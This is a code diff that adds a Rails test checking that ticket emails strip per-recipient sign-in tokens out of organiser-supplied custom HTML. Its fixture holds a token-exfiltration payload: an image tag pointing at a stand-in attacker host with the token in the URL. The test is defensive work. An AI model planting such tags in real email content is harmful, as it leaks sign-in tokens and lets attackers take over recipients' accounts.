@@ -143,6 +143,22 @@ class EventsTest < ActiveSupport::TestCase
     assert_includes html, 'Hello'
   end
 
+  test 'ticket email strips sign-in tokens from custom html images' do
+    create_organisation(show_details_table_in_ticket_emails: true, show_sign_in_link_in_ticket_emails: true)
+    create_event(
+      name: 'Workshop %recipient.token%',
+      prices: [0],
+      extra_info_for_ticket_email: '<img src="https://attacker.example/%recipient.token%">'
+    )
+    order = @event.orders.new(account: @account)
+    html = EmailHelper.html(:tickets, event: @event, order: order, account: @account, tickets_table: '', header_image_url: nil)
+
+    refute_match(%r{src="[^"]*%recipient\.token%}, html)
+    refute_includes html, 'Workshop %recipient.token%'
+    assert_includes html, 'Workshop'
+    assert_includes html, 'sign_in_token=%recipient.token%'
+  end
+
   test 'nested ticket type cannot reference another event ticket group' do
     create_event(prices: [0])
     own_group = @event.ticket_groups.create!(name: 'Own', capacity: 10)
